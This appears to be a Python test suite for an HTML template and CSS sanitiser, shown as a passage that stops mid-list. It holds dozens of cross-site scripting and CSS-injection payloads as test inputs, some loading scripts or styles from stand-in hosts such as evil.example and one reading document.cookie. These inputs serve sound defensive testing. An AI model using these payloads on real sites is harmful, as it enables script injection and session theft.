"""The template and CSS sanitiser: a hostile input suite, an independent safety check of every output, property
tests (cleaning twice changes nothing, output is always safe) and the shared corpus the web tests read."""
import json
import random
import re
import unittest
from html.parser import HTMLParser
from pathlib import Path

from designs import sanitize
from designs.sanitize import sanitize_css, sanitize_template

CORPUS_FILE = Path(__file__).with_name("sanitize_corpus.json")
FACE = 7
PREFIX = f".cfl .face.cf-{FACE}"

# ---------------------------------------------------------------- an independent look at the output
ALLOWED_HTML = {"div", "span", "p", "i", "b", "small", "br", "img", "svg", "g", "defs", "path", "rect", "circle", "ellipse", "line",
                "polyline", "polygon", "lineargradient", "radialgradient", "stop", "clippath", "mask"}
ALLOWED_ATTRS = {"class", "src", "alt", "width", "height", "viewbox", "preserveaspectratio", "d", "points", "transform",
                 "gradienttransform", "stroke-dasharray", "x", "y", "x1", "y1", "x2", "y2", "cx", "cy", "r", "rx", "ry", "fx", "fy",
                 "stroke-width", "stroke-miterlimit", "offset", "fill", "stroke", "stop-color", "opacity", "fill-opacity",
                 "stroke-opacity", "stop-opacity", "clip-path", "mask", "id", "stroke-linecap", "stroke-linejoin", "fill-rule",
                 "clip-rule", "gradientunits", "spreadmethod", "clippathunits", "maskunits"}
VOID_TAGS = {"br", "img", "path", "rect", "circle", "ellipse", "line", "polyline", "polygon", "stop"}


class Oracle(HTMLParser):
    """Parses the sanitised template with the standard library's own parser and notes anything outside the allowlist."""

    def __init__(self):
        super().__init__(convert_charrefs=False)
        self.problems = []
        self.stack = []

    def handle_starttag(self, tag, attrs):
        if tag not in ALLOWED_HTML:
            self.problems.append(f"tag {tag}")
        for name, value in attrs:
            if name.lower() not in ALLOWED_ATTRS:
                self.problems.append(f"attr {name}")
            v = (value or "").lower()
            if name == "src" and not v.startswith("data:image/"):
                self.problems.append("src " + v[:30])
            if name != "src" and re.search(r"javascript|expression|vbscript|data:", v):
                self.problems.append(f"value {v[:30]}")
        if tag not in VOID_TAGS:
            self.stack.append(tag)

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)
        if tag not in VOID_TAGS and self.stack:
            self.stack.pop()

    def handle_endtag(self, tag):
        if not self.stack or self.stack[-1] != tag:
            self.problems.append(f"unbalanced </{tag}>")
        else:
            self.stack.pop()

    def handle_comment(self, data):
        self.problems.append("comment")

    def handle_decl(self, decl):
        self.problems.append("declaration")

    def unknown_decl(self, data):
        self.problems.append("cdata")

    def handle_pi(self, data):
        self.problems.append("pi")


FORBIDDEN_TEXT = ("<script", "javascript:", "onerror", "onload", "onclick", "<style", "<iframe", "<object", "<embed", "foreignobject",
                  "<use", "expression(", "style=", "href=", "xlink", "<!--", "data:text", "<a ", "<link", "<meta", "<form", "<input")


def assert_safe_template(case, out, allowed_data=True):
    parser = Oracle()
    parser.feed(out)
    parser.close()
    case.assertEqual(parser.problems, [], f"{parser.problems} in {out[:200]!r}")
    case.assertEqual(parser.stack, [], f"unclosed {parser.stack} in {out[:200]!r}")
    markup = " ".join(re.findall(r"<[^>]*>", out)).lower()
    for bad in FORBIDDEN_TEXT:
        case.assertNotIn(bad, markup, f"{bad} in {out[:200]!r}")
    case.assertNotIn("<!--", out)
    # every {{ is a known placeholder, conditional or else
    for m in re.finditer(r"\{\{([^{}]*)\}\}", out):
        inner = m.group(1)
        if not re.fullmatch(r"[#/]?[A-Za-z_ ]*", inner):
            continue  # not placeholder-shaped: inert text
        case.assertTrue(inner in sanitize.PLACEHOLDERS or inner in ("else", "/if") or (inner.startswith("#if ") and inner[4:] in sanitize.CONDITIONS), inner)
    depth = 0
    for m in re.finditer(r"\{\{(#if [a-z_]+|/if)\}\}", out):
        depth += 1 if m.group(1).startswith("#if") else -1
        case.assertGreaterEqual(depth, 0)
    case.assertEqual(depth, 0)


FORBIDDEN_CSS = ("@import", "@charset", "@font-face", "expression", "behavior", "-moz-binding", "javascript", "vbscript", "<",
                 "\\", "/*", "*/", "position:fixed", "position:sticky", "!important", "@media", "@supports", "@namespace")


def assert_safe_css(case, out):
    low = out.lower()
    for bad in FORBIDDEN_CSS:
        case.assertNotIn(bad, low, f"{bad} in {out[:300]!r}")
    # no unit that depends on the screen, outside data pictures
    plain = re.sub(r'url\("[^"]*"\)', "", out)
    case.assertIsNone(re.search(r"\d(vw|vh|vmin|vmax|px|rem|pt)\b", plain), plain[:300])
    case.assertNotIn("url(", plain.replace('url("', "XX"), plain[:300])
    # every url is a data picture or one the test allowed
    for m in re.finditer(r'url\("([^"]*)"\)', out):
        case.assertTrue(m.group(1).startswith("data:image/") or m.group(1) in ("/media/logos/own.png",), m.group(1)[:80])
    # braces are balanced and every rule is scoped
    depth = 0
    for ch in re.sub(r'"[^"]*"', '""', out):
        depth += 1 if ch == "{" else -1 if ch == "}" else 0
        case.assertGreaterEqual(depth, 0, out[:300])
    case.assertEqual(depth, 0, out[:300])
    for rule in re.finditer(r"(^|\})\s*([^{}@]+)\{", out):
        for selector in rule.group(2).split(","):
            selector = selector.strip()
            if selector and not re.fullmatch(r"(\d+(\.\d+)?%|from|to)", selector):
                case.assertTrue(selector.startswith(PREFIX), f"unscoped {selector!r}")
    names = re.findall(r"@keyframes ([^{]+)\{", out)
    for n in names:
        case.assertTrue(n.startswith(f"cf{FACE}-"), n)
    for decl_block in re.finditer(r"\{([^{}]*(?:\{[^{}]*\}[^{}]*)*)\}", out):
        for prop in re.findall(r"(?:^|[;{}])\s*([a-z-]+):", re.sub(r'"[^"]*"', '""', decl_block.group(1))):
            case.assertIn(prop, sanitize.PROPS, prop)


def clean_t(src):
    return sanitize_template(src, allowed_media=["/media/logos/own.png"])


def clean_c(src):
    return sanitize_css(src, FACE, allowed_media=["/media/logos/own.png"])


# ---------------------------------------------------------------- hostile templates
HOSTILE_TEMPLATES = [
    ("script", "<script>alert(1)</script>"),
    ("script upper", "<SCRIPT SRC=//evil/x.js></SCRIPT>"),
    ("script nested split", "<scr<script>ipt>alert(1)</scr</script>ipt>"),
    ("script no close", "<script>alert(1)"),
    ("script in div", "<div>{{name}}<script>document.cookie</script></div>"),
    ("img onerror", "<img src=x onerror=alert(1)>"),
    ("img onerror quoted", '<img src="x" onerror="alert(1)">'),
    ("img javascript src", '<img src="javascript:alert(1)">'),
    ("img entity javascript", '<img src="java&#115;cript:alert(1)">'),
    ("img hex entity", '<img src="&#x6A;avascript:alert(1)">'),
    ("img tab in scheme", '<img src="jav&#x09;ascript:alert(1)">'),
    ("img named entity colon", '<img src="javascript&colon;alert(1)">'),
    ("img leading space", '<img src=" javascript:alert(1)">'),
    ("img backtick", "<img src=`x` onerror=alert(1)>"),
    ("img data html", '<img src="data:text/html;base64,PHNjcmlwdD4=">'),
    ("img data svg", '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">'),
    ("img remote", '<img src="https://evil.example/pixel.gif">'),
    ("img protocol relative", '<img src="//evil.example/pixel.gif">'),
    ("img foreign media path", '<img src="/media/logos/theirs.png">'),
    ("svg onload", "<svg onload=alert(1)></svg>"),
    ("svg script", "<svg><script>alert(1)</script></svg>"),
    ("svg foreignobject", "<svg><foreignObject><iframe src=x></iframe></foreignObject></svg>"),
    ("svg use", '<svg><use href="data:image/svg+xml;base64,AAAA#x"/></svg>'),
    ("svg use xlink", '<svg><use xlink:href="//evil/x.svg#a"/></svg>'),
    ("svg animate", '<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>'),
    ("svg set", '<svg><a><set attributeName="onmouseover" to="alert(1)"/></a></svg>'),
    ("svg image", '<svg><image href="//evil/x.png"/></svg>'),
    ("svg style", "<svg><style>@import 'x'</style></svg>"),
    ("svg a href", '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>'),
    ("svg path onclick", '<svg><path d="M0 0" onclick="alert(1)"/></svg>'),
    ("svg fill url js", '<svg><rect fill="url(javascript:alert(1))"/></svg>'),
    ("svg clip remote", '<svg><rect clip-path="url(http://evil/x#c)" width="1" height="1"/></svg>'),
    ("svg path script chars", '<svg><path d="M0 0;alert(1)"/></svg>'),
    ("svg viewbox payload", '<svg viewBox="0 0 1 1 onload=alert(1)"></svg>'),
    ("svg style attr", '<svg style="x:y"><path d="M0 0"/></svg>'),
    ("style attr url js", '<div style="background:url(javascript:alert(1))">x</div>'),
    ("style attr expression", '<div style="width:expression(alert(1))">x</div>'),
    ("style attr fixed", '<div style="position:fixed;inset:0">x</div>'),
    ("a href js", '<a href="javascript:alert(1)">x</a>'),
    ("a href entity", '<a href="jav&#x09;ascript:alert(1)">x</a>'),
    ("iframe srcdoc", "<iframe srcdoc='<script>alert(1)</script>'></iframe>"),
    ("object", '<object data="javascript:alert(1)"></object>'),
    ("embed", '<embed src="javascript:alert(1)">'),
    ("link", '<link rel=stylesheet href="//evil/x.css">'),
    ("meta refresh", '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'),
    ("base", '<base href="//evil/">'),
    ("form", '<form action="javascript:alert(1)"><input name=x></form>'),
    ("input autofocus", "<input onfocus=alert(1) autofocus>"),
    ("button formaction", '<button formaction="javascript:alert(1)">x</button>'),
    ("math", '<math><mi xlink:href="javascript:alert(1)">x</mi></math>'),
    ("style element", "<style>@import url(//evil/x.css);</style>"),
    ("comment script", "<!-- <script>alert(1)</script> -->"),
    ("comment unterminated", "<div>ok</div><!-- <script>alert(1)</script>"),
    ("cdata", "<![CDATA[<script>alert(1)</script>]]>"),
    ("processing instruction", "<?php echo 1; ?><div>x</div>"),
    ("textarea escape", "<textarea><script>alert(1)</script></textarea>"),
    ("noscript trick", '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'),
    ("plaintext", "<plaintext><script>alert(1)"),
    ("template element", "<template><script>alert(1)</script></template>"),
    ("title trick", "<title><img src=x onerror=alert(1)></title>"),
    ("unclosed attribute", '<div class="a onclick=alert(1)'),
    ("unclosed tag", "<div class=a"),
    ("unclosed attr quote", '<div class="a>{{name}}</div>'),
    ("duplicate attrs", '<div class="a" class="b" onclick="x">z</div>'),
    ("uppercase handler", '<div ONCLICK="alert(1)" OnMouseOver=alert(2)>z</div>'),
    ("slash handler", "<div/onclick=alert(1)>z</div>"),
    ("newline attrs", "<div\nclass=x\nonclick=y>z</div>"),
    ("entity encoded tag", "&lt;script&gt;alert(1)&lt;/script&gt;"),
    ("numeric entity tag", "&#60;script&#62;alert(1)&#60;/script&#62;"),
    ("bare ampersand", "AT&T &amp; &unknown; &#0; &#xD800; &#1114112; &#x41;"),
    ("lone angle", "a < b > c <3 <= <"),
    ("null bytes", "<scr\x00ipt>alert(1)</scr\x00ipt>"),
    ("control chars", "<di\x01v onclick\x0b=alert(1)>x</div>"),
    ("unknown tags kept text", "<section><h1>Title</h1><a>link</a></section>"),
    ("class tricks", '<div class="card face back colg cohead x">y</div>'),
    ("class odd chars", '<div class="a;b {c} d">y</div>'),
    ("deep nesting", "<div>" * 200 + "x" + "</div>" * 200),
    ("deep unclosed", "<div><span><b><i><p>" * 30),
    ("mismatched close", "</div></span><div><b></div></b>"),
    ("paragraph block", "<p><div>x</div></p>"),
    ("placeholder in attr", '<div class="{{name}}" title="{{phone}}">{{name}}</div>'),
    ("placeholder unknown", "{{bogus}} {{ constructor }} {{__proto__}} {{name.toString()}} {{{name}}}"),
    ("placeholder spaces", "{{ name }} {{  first  }}"),
    ("if unbalanced", "{{#if photo}}<div>x{{/if}}</div>{{/if}}{{else}}"),
    ("if unknown", "{{#if bogus}}x{{/if}}{{#if}}y{{/if}}{{#if photo extra}}z{{/if}}"),
    ("if across tags", "<div>{{#if phone}}<b>{{phone}}</div></b>{{/if}}"),
    ("else twice", "{{#if photo}}a{{else}}b{{else}}c{{/if}}"),
    ("if never closed", "{{#if photo}}<div>{{#if phone}}x"),
    ("script in if", "{{#if photo}}<script>alert(1)</script>{{/if}}"),
    ("huge repeat", "<div>" + "{{name}}" * 5000 + "</div>"),
    ("img no src", '<img alt="x" onerror="y">'),
    ("br void", "<br><br/><br >"),
]


class HostileTemplateTests(unittest.TestCase):
    def test_every_hostile_template_comes_out_safe(self):
        self.assertGreaterEqual(len(HOSTILE_TEMPLATES), 60)
        for name, src in HOSTILE_TEMPLATES:
            with self.subTest(name):
                res = clean_t(src)
                self.assertEqual(res.errors, [])
                assert_safe_template(self, res.value)
                again = clean_t(res.value)
                self.assertEqual(again.value, res.value, "cleaning twice must change nothing")
                self.assertEqual(again.warnings, [], "clean output must have nothing left to remove")

    def test_specific_results(self):
        self.assertEqual(clean_t("<script>alert(1)</script>").value, "")
        self.assertEqual(clean_t("<div onclick='x()'>{{name}}</div>").value, "<div>{{name}}</div>")
        self.assertEqual(clean_t('<img src=x onerror=alert(1)>').value, "")
        self.assertEqual(clean_t("<section><h1>T</h1></section>").value, "T")
        self.assertEqual(clean_t("&lt;script&gt;").value, "&lt;script&gt;")
        self.assertEqual(clean_t("a < b").value, "a &lt; b")
        self.assertEqual(clean_t("{{ name }}").value, "{{name}}")
        self.assertEqual(clean_t("{{#if photo}}<div>x").value, "{{#if photo}}<div>x</div>{{/if}}")
        self.assertEqual(clean_t("{{#if photo}}a{{else}}b{{/if}}").value, "{{#if photo}}a{{else}}b{{/if}}")
        self.assertEqual(clean_t('<div class="card k">y</div>').value, '<div class="k">y</div>')
        self.assertEqual(clean_t("<br><br/>").value, "<br><br>")

    def test_allowed_pictures(self):
        ok = clean_t('<img src="data:image/png;base64,iVBORw0KGgo=" alt="x" width="10%">')
        self.assertEqual(ok.value, '<img src="data:image/png;base64,iVBORw0KGgo=" alt="x" width="10%">')
        own = clean_t('<img src="/media/logos/own.png">')
        self.assertEqual(own.value, '<img src="/media/logos/own.png">')
        # the host is not trusted: only the stored path of one's own file counts, and a foreign address is dropped
        self.assertEqual(clean_t('<img src="/media/logos/theirs.png">').value, "")

    def test_svg_subset_survives(self):
        src = (
            '<svg viewBox="0 0 10 10" width="10cqw"><defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#fff"/>'
            '<stop offset="100%" stop-color="var(--cacc)" stop-opacity=".5"/></linearGradient><clipPath id="c"><rect width="5" height="5"/></clipPath></defs>'
            '<g fill="url(#g)" clip-path="url(#c)"><path d="M0 0L5 5Z" stroke="currentColor" stroke-width="1"/><circle cx="5" cy="5" r="2"/></g></svg>'
        )
        res = clean_t(src)
        self.assertEqual(res.warnings, [])
        for piece in ("<linearGradient", "<clipPath", 'viewBox="0 0 10 10"', "<stop offset=\"0\" stop-color=\"#fff\"/>", 'fill="url(#g)"'):
            self.assertIn(piece, res.value)
        assert_safe_template(self, res.value)

    def test_size_limits(self):
        big = clean_t("<div></div>" * 6000)
        self.assertEqual([e["code"] for e in big.errors], ["too_large"])
        self.assertEqual(big.value, "")
        many = clean_t("<i></i>" * 9000)
        self.assertTrue(many.errors)
        ok = clean_t("<div>x</div>" * 100)
        self.assertEqual(ok.errors, [])
        self.assertEqual([e["code"] for e in clean_t(None).errors], ["type"])
        self.assertEqual([e["code"] for e in clean_t(5).errors], ["type"])

    def test_depth_is_limited(self):
        out = clean_t("<div>" * 100 + "deep" + "</div>" * 100).value
        self.assertLessEqual(out.count("<div>"), sanitize.MAX_DEPTH)
        self.assertIn("deep", out)

    def test_warnings_say_what_was_removed(self):
        res = clean_t('<div class="card" onclick="x" style="color:red">{{nope}}<script>1</script></div>')
        codes = {w["code"] for w in res.warnings}
        self.assertEqual(codes, {"reserved_class", "event_attr", "style_attr", "placeholder", "dropped_element"})
        for w in res.warnings:
            self.assertEqual(w["where"], "template")
            self.assertTrue(w["message"].endswith((".", ")")))
            self.assertEqual(w["count"], 1)


# ---------------------------------------------------------------- hostile CSS
HOSTILE_CSS = [
    ("import url", "@import url(//evil/x.css); .a{color:red}"),
    ("import string", "@import 'x.css';"),
    ("import after rule", ".a{color:red} @import url(x);"),
    ("url javascript", ".a{background:url(javascript:alert(1))}"),
    ("url javascript quoted", '.a{background:url( "javascript:alert(1)" )}'),
    ("url data html", ".a{background:url(data:text/html,<script>alert(1)</script>)}"),
    ("url remote", ".a{background:url(http://evil.example/x.png)}"),
    ("url remote https quoted", '.a{background-image:url("https://evil.example/x.png")}'),
    ("url protocol relative", ".a{background:url(//evil.example/x.png)}"),
    ("url foreign media", ".a{background:url(/media/logos/theirs.png)}"),
    ("url backslash escapes", r".a{background:\75 rl(javascript:alert(1))}"),
    ("url function escape", r".a{background:ur\6c(javascript:alert(1))}"),
    ("url escaped scheme", r".a{background:url(\6a avascript:alert(1))}"),
    ("url comment in name", ".a{background:ur/**/l(javascript:alert(1))}"),
    ("url unterminated", ".a{background:url(javascript:alert(1)"),
    ("url bad chars", '.a{background:url(a b"c)}'),
    ("expression", ".a{width:expression(alert(1))}"),
    ("expression escaped", r".a{width:\65 xpression(alert(1))}"),
    ("expression in calc", ".a{width:calc(expression(1))}"),
    ("binding", ".a{-moz-binding:url(//evil/x.xml#x)}"),
    ("behavior", ".a{behavior:url(x.htc)}"),
    ("brace injection", ".a{color:red}} body{display:none}"),
    ("brace injection 2", ".a{color:red;} } .b{display:none} .c{"),
    ("brace in string", '.a{content:"}"} body{display:none}'),
    ("style close", ".a{color:red}</style><script>alert(1)</script>.b{color:blue}"),
    ("style close in string", '.a{content:"</style><script>alert(1)</script>"}'),
    ("html comment tokens", "<!-- .a{color:red} --> .b{color:blue}"),
    ("nested comment", "/*/* */ .a{color:red} */ body{display:none}"),
    ("comment between", ".a{co/**/lor:red}"),
    ("comment unterminated", ".a{color:red} /* .b{display:none}"),
    ("unicode escape property", r".a{\70 osition:fixed}"),
    ("unicode escape value", r".a{position:\66 ixed}"),
    ("escaped newline", ".a{color:re\\\nd}"),
    ("escape at end", ".a{color:red}\\"),
    ("position fixed", ".a{position:fixed;top:0}"),
    ("position sticky", ".a{position:sticky}"),
    ("position absolute ok", ".a{position:absolute;left:3cqw}"),
    ("font face", '@font-face{font-family:"X";src:url(//evil/x.woff2)}'),
    ("charset", '@charset "x"; .a{color:red}'),
    ("media", "@media (min-width:1px){.a{color:red}}"),
    ("supports", "@supports (display:grid){.a{color:red}}"),
    ("namespace", "@namespace url(http://evil/);"),
    ("page", "@page{margin:0}"),
    ("keyframes unprefixed", "@keyframes evil{from{opacity:0}to{opacity:1}}"),
    ("keyframes prefixed", f"@keyframes cf{FACE}-ok{{from{{opacity:0}}to{{opacity:1}}}} .a{{animation:cf{FACE}-ok 1s ease 1}}"),
    ("keyframes infinite", f"@keyframes cf{FACE}-x{{0%{{opacity:0}}100%{{opacity:1}}}} .a{{animation:cf{FACE}-x 1s infinite}}"),
    ("keyframes long", f".a{{animation:cf{FACE}-x 30s}}"),
    ("keyframes repeat", f".a{{animation:cf{FACE}-x 2s 4}}"),
    ("keyframes other face", ".a{animation:cf99-x 1s}"),
    ("animation iteration infinite", f".a{{animation-iteration-count:infinite;animation-name:cf{FACE}-x;animation-duration:1s}}"),
    ("animation duration long", ".a{animation-duration:99s}"),
    ("keyframes with url", f"@keyframes cf{FACE}-u{{from{{background:url(javascript:x)}}to{{opacity:1}}}}"),
    ("vw unit", ".a{width:100vw}"),
    ("vh unit", ".a{height:100vh}"),
    ("vmin unit", ".a{top:-100vmin}"),
    ("px unit", ".a{width:10px}"),
    ("rem unit", ".a{font-size:2rem}"),
    ("calc vw", ".a{width:calc(100vw - 2cqw)}"),
    ("translate vw", ".a{transform:translate(100vw,0)}"),
    ("content url", '.a::before{content:url(http://evil/x.png)}'),
    ("content attr", ".a::before{content:attr(href)}"),
    ("content counter", ".a::before{content:counter(x)}"),
    ("filter url", ".a{filter:url(#x)}"),
    ("filter blur huge", ".a{filter:blur(500cqw)}"),
    ("mask url", ".a{mask:url(x.svg)}"),
    ("image-set", ".a{background:image-set(url(x.png) 1x)}"),
    ("webkit image-set", ".a{background:-webkit-image-set(url(x.png) 1x)}"),
    ("element()", ".a{background:-moz-element(#x)}"),
    ("custom property", ".a{--x:url(javascript:alert(1));color:var(--x)}"),
    ("var unknown", ".a{color:var(--secret, red)}"),
    ("selector body", "body{display:none}"),
    ("selector html", "html,:root{display:none}"),
    ("selector star", "*{display:none}"),
    ("selector id", "#id{color:red}"),
    ("selector attribute", "[onclick]{color:red} a[href^=javascript]{color:red}"),
    ("selector hover", "a:hover{color:red}"),
    ("selector list mix", ".a,body,.b{color:red}"),
    ("selector escape", r".\62 ody{color:red}"),
    ("selector universal child", ".a>*{color:red}"),
    ("selector sibling", ".a+.b~.c{color:red}"),
    ("selector pseudo element", ".a::before,.a::after{content:'x'}"),
    ("selector bad pseudo", ".a::first-line{color:red} .b::selection{color:red}"),
    ("selector scope", ":scope{color:red} :scope .a{color:blue}"),
    ("selector not", ".a:not(.b){color:red} .a:not(body){color:red}"),
    ("selector nth", ".a:nth-child(2n+1){color:red} .a:nth-child(javascript){color:red}"),
    ("nested rule", ".a{color:red; .b{color:blue}}"),
    ("nested at-rule", ".a{@media screen{color:blue}}"),
    ("bad property", ".a{zoom:5;cursor:url(x),auto;resize:both;appearance:none;user-select:none}"),
    ("important", ".a{color:red !important}"),
    ("important spaced", ".a{color:red ! important}"),
    ("unterminated string", '.a{content:"abc}'),
    ("unterminated string 2", ".a{content:'abc\n;color:red}"),
    ("null bytes", ".a{ba\x00ckground:ur\x00l(x)}"),
    ("bom", "﻿.a{color:red}"),
    ("empty", ""),
    ("only comments", "/* x */ /* y */"),
    ("garbage", "}}}{{{;;;:::)))((("),
    ("font family unknown", '.a{font-family:"Evil Font",system-ui}'),
    ("font family known", '.a{font-family:"Poppins",sans-serif}'),
    ("z-index huge", ".a{z-index:9999}"),
    ("opacity big", ".a{opacity:50}"),
    ("data uri huge", ".a{background:url(data:image/png;base64," + "A" * 210000 + ")}"),
    ("many rules", ".a{color:red}\n" * 500),
]


class HostileCssTests(unittest.TestCase):
    def test_every_hostile_stylesheet_comes_out_safe(self):
        self.assertGreaterEqual(len(HOSTILE_CSS), 60)
        for name, src in HOSTILE_CSS:
            with self.subTest(name):
                res = clean_c(src)
                if res.errors:
                    self.assertEqual(res.value, "" if res.errors[0]["code"] == "too_large" else res.value)
                assert_safe_css(self, res.value)
                again = clean_c(res.value)
                self.assertEqual(again.value, res.value, "cleaning twice must change nothing")

    def test_what_stays_and_what_goes(self):
        self.assertEqual(clean_c(".a{color:red}").value, f"{PREFIX} .a{{color:red}}")
        self.assertEqual(clean_c(".a{color:red}} body{display:none}").value, f"{PREFIX} .a{{color:red}}")
        self.assertEqual(clean_c("@import url(x); .a{color:red}").value, f"{PREFIX} .a{{color:red}}")
        self.assertEqual(clean_c(r".a{\63 olor:red}").value, f"{PREFIX} .a{{color:red}}")
        self.assertEqual(clean_c(".a{width:100vw;color:red}").value, f"{PREFIX} .a{{color:red}}")
        self.assertEqual(clean_c(".a{position:fixed;left:1cqw}").value, f"{PREFIX} .a{{left:1cqw}}")
        self.assertEqual(clean_c(".a{color:red !important}").value, f"{PREFIX} .a{{color:red}}")
        self.assertEqual(clean_c("body{x:y}").value, "")
        self.assertEqual(clean_c(".a,body{color:red}").value, f"{PREFIX} .a{{color:red}}")
        self.assertEqual(clean_c(":scope{color:red}").value, f"{PREFIX}{{color:red}}")
        self.assertEqual(clean_c("*{color:red}").value, f"{PREFIX} *{{color:red}}")
        self.assertEqual(clean_c(".a>.b+.c{left:0}").value, f"{PREFIX} .a > .b + .c{{left:0}}")
        self.assertEqual(clean_c(".a:first-child::before{content:'x'}").value, f'{PREFIX} .a:first-child::before{{content:"x"}}')

    def test_values_that_must_work(self):
        good = [
            "background:linear-gradient(135deg,var(--cbg) 0%,var(--cbg2) 100%)", "background:radial-gradient(circle at 20% 30%,rgba(255,255,255,.2),transparent 60%)",
            "transform:translate(-50%,-50%) rotate(-4deg) scale(1.1)", "box-shadow:0 1cqw 3cqw rgba(0,0,0,.3),inset 0 0 1cqw #fff",
            "border:.3cqw solid var(--cacc)", "border-radius:50%", "border-radius:2cqw 1cqw / 3cqw 1cqw", "clip-path:polygon(0 0,100% 0,60% 100%,0 100%)",
            "filter:blur(1cqw) brightness(1.1)", "width:calc(100% - 8cqw)", "font-weight:700",
            "font-size:clamp(2cqw,5cqw,8cqw)", "letter-spacing:-.02em", "text-transform:uppercase", "display:grid", "grid-template-columns:1fr 2fr",
            "grid-template-columns:repeat(2,1fr)", "inset:3cqw", "margin:0 auto", "padding:1cqw 2cqw 3cqw 4cqw", "opacity:.5", "z-index:3",
            "aspect-ratio:1/1", "object-fit:cover", "color:#abc", "color:#aabbccdd", "color:rgb(10 20 30 / 50%)", "color:hsl(200deg 50% 50%)",
            "background-size:cover", "background-position:center", "line-height:1.1", "white-space:nowrap", "text-shadow:0 0 1cqw rgba(0,0,0,.4)",
            "mix-blend-mode:multiply", "overflow:hidden", "text-overflow:ellipsis", "pointer-events:none", "flex:1 1 0", "gap:1cqw",
            "animation:cf7-pop .8s ease-out 1 both", "transform-origin:50% 100%", "backdrop-filter:blur(2cqw)",
        ]
        for decl in good:
            with self.subTest(decl):
                out = clean_c(f"@keyframes cf7-pop{{from{{opacity:0}}to{{opacity:1}}}} .x{{{decl}}}").value
                self.assertIn(decl.split(":")[0] + ":", out)
                self.assertNotIn("Removed", out)

    def test_keyframes_and_animation_limits(self):
        ok = clean_c(f"@keyframes cf{FACE}-a{{0%{{opacity:0}}100%{{opacity:1}}}} .x{{animation:cf{FACE}-a 2s ease 1 forwards}}").value
        self.assertIn("@keyframes cf7-a{0%{opacity:0}100%{opacity:1}}", ok)
        self.assertIn("animation:cf7-a 2s ease 1 forwards", ok)
        self.assertNotIn("animation", clean_c(f".x{{animation:cf{FACE}-a 6s}}").value)
        self.assertNotIn("animation", clean_c(f".x{{animation:cf{FACE}-a 2s infinite}}").value)
        self.assertNotIn("animation", clean_c(f".x{{animation:cf{FACE}-a 2s 3}}").value)
        self.assertNotIn("animation", clean_c(".x{animation:other 1s}").value)
        self.assertNotIn("@keyframes", clean_c("@keyframes other{from{opacity:0}}").value)
        self.assertNotIn("animation-iteration-count", clean_c(".x{animation-iteration-count:infinite}").value)

    def test_data_pictures_and_own_media(self):
        png = "data:image/png;base64,iVBORw0KGgo="
        out = clean_c(f".a{{background:url({png})}}").value
        self.assertIn(f'url("{png}")', out)
        self.assertIn('url("/media/logos/own.png")', clean_c(".a{background-image:url(/media/logos/own.png)}").value)
        self.assertNotIn("url(", clean_c(".a{background-image:url(/media/logos/other.png)}").value)
        svg = clean_c(".a{background:url(\"data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=\")}").value
        self.assertIn("data:image/svg+xml", svg)
        big = clean_c(".a{background:url(data:image/png;base64," + "A" * 150000 + ")} .b{background:url(data:image/png;base64," + "A" * 150000 + ")}")
        self.assertEqual(big.value.count("url("), 1)
        self.assertLessEqual(big.data_bytes, sanitize.MAX_DATA_BYTES)
        tpl = sanitize.sanitize_template('<img src="data:image/png;base64,' + "A" * 150000 + '"><img src="data:image/png;base64,' + "A" * 150000 + '">')
        self.assertEqual(tpl.value.count("<img"), 1)
        _, css, _, errors = sanitize.sanitize_face('<img src="data:image/png;base64,' + "A" * 150000 + '">', ".a{background:url(data:image/png;base64," + "A" * 100000 + ")}", 3)
        self.assertNotIn("url(", css)

    def test_size_and_count_limits(self):
        self.assertEqual([e["code"] for e in clean_c("a{}" * 50000).errors], ["too_large"])
        out = clean_c(".a{color:red}\n" * 1000).value
        self.assertLessEqual(out.count("{"), sanitize.MAX_RULES)
        self.assertEqual([e["code"] for e in clean_c(None).errors], ["type"])

    def test_warnings(self):
        res = clean_c("@import 'x'; body{x:y} .a{width:100vw;zoom:2;color:red !important}")
        codes = {w["code"] for w in res.warnings}
        self.assertEqual(codes, {"at_rule", "selector", "value", "property", "important"})
        for w in res.warnings:
            self.assertEqual(w["where"], "css")

    def test_scope_follows_the_face_id(self):
        self.assertTrue(sanitize_css(".a{color:red}", 123).value.startswith(".cfl .face.cf-123 .a"))


# ---------------------------------------------------------------- property tests
HTML_BITS = [
    "<div>", "</div>", "<span class=\"a b\">", "</span>", "<p>", "</p>", "<b>", "</b>", "<i>", "</i>", "<small>", "</small>", "<br>", "<br/>",
    "<img src=\"data:image/png;base64,AAAA\" alt=\"x\">", "<img src=x onerror=alert(1)>", "<script>", "</script>", "<style>", "</style>",
    "<svg viewBox=\"0 0 1 1\">", "</svg>", "<path d=\"M0 0L1 1\"/>", "<rect width=\"1\" height=\"1\" fill=\"#fff\"/>", "<circle r=\"1\"/>",
    "<g>", "</g>", "<defs>", "</defs>", "<linearGradient id=\"g\">", "</linearGradient>", "<stop offset=\"0\"/>", "<foreignObject>", "</foreignObject>",
    "{{name}}", "{{title}}", "{{photo}}", "{{#if photo}}", "{{#if phone}}", "{{else}}", "{{/if}}", "{{bogus}}", "{{", "}}", "text", " ", "\n",
    "&amp;", "&lt;", "&", "<", ">", "\"", "'", "<!--", "-->", "<a href=\"javascript:x\">", "</a>", "<div onclick=\"x\">", "<div style=\"a:b\">",
    "class=\"x\"", "=", "/", "\\", "\x00", "<?", "<![CDATA[", "]]>", "<iframe>", "javascript:", "&#106;avascript:", "<table>", "<td>",
]
CSS_BITS = [
    ".a", ".b", "{", "}", ";", ":", ",", " ", "\n", "color:red", "color:#fff", "width:10cqw", "width:100vw", "position:fixed", "position:absolute",
    "background:url(javascript:x)", "background:url(data:image/png;base64,AAAA)", "background:linear-gradient(#fff,#000)", "@import", "@keyframes",
    f"@keyframes cf{FACE}-k", "from", "to", "50%", "animation:cf7-k 1s", "animation:x infinite", "/*", "*/", "\\", "\\6a ", "url(", ")", "(", "\"", "'",
    "expression(", "!important", "body", "html", ":root", "*", ">", "+", "~", "::before", ":hover", ":first-child", "content:\"x\"", "content:url(x)",
